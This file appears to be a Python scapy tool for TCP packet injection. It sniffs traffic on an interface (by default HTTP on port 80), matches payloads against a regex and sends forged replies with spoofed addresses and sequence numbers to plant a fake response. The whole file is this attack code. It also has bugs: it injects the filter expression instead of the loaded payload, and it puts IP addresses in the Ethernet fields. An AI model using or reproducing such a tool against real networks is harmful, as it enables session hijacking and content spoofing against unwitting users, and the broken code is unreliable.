#!/usr/bin/env python
import argparse
import re
from scapy.all import *
import signal
import sys


def safe_close(signal, frame):
        print('User requested to close ')
        sys.exit(0)

signal.signal(signal.SIGINT, safe_close)

def inject_main(interface, regexp, datafile, exp):
	response_file = open(args.datafile,'r')
	response = response_file.read()
	response_file.close()
	regex_engine = re.compile(regexp)
	sniff(
		iface=interface,
		filter=exp,
		prn=lambda packet: _process_packet(packet, regex_engine, exp)
		)

def _process_packet(packet, regex_engine, response):
	if(_is_target_packet(packet, regex_engine)):
		_inject_reply(packet, response)

def _is_target_packet(packet, regex_engine):
	#Apply the regex matching to the packet only if it is tcp
	return re.search(regex_engine, packet[TCP][Raw].load)

def _inject_reply(packet, response_payload):
	loaded_response =  Ether(
		src		=	packet[IP].dst,
		dst 	=	packet[IP].src
		) / IP(
		src 	=	packet[IP].dst,
		dst 	=	packet[IP].src,
		id 		=	packet[IP].id + 42
		) / TCP(
		sport	=	packet[TCP].dport,
		dport	=	packet[TCP].sport,
		ack 	= 	packet[TCP].seq + len(packet[TCP][Raw].load),
		seq 	= 	packet[TCP].ack,
		) / response_payload

	sendp(loaded_response)




if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("-i", "--interface", default="eth0",
		help="Target Network interface to intercept traffic")
	parser.add_argument("-r", "--regexp", default=".*",
		help="A regular expression to filter out packets")
	parser.add_argument("-d", "--datafile", default="data/examples/payload.data",
		help="The fake payload to be injected as response")
	parser.add_argument("-e", "--expression", default="tcp and port 80", 
		help="A berkeley packet filter describing the packets to be captured")
	#Parse the command line arguments
	args = parser.parse_args()
	inject_main(args.interface, args.regexp, args.datafile, args.expression)
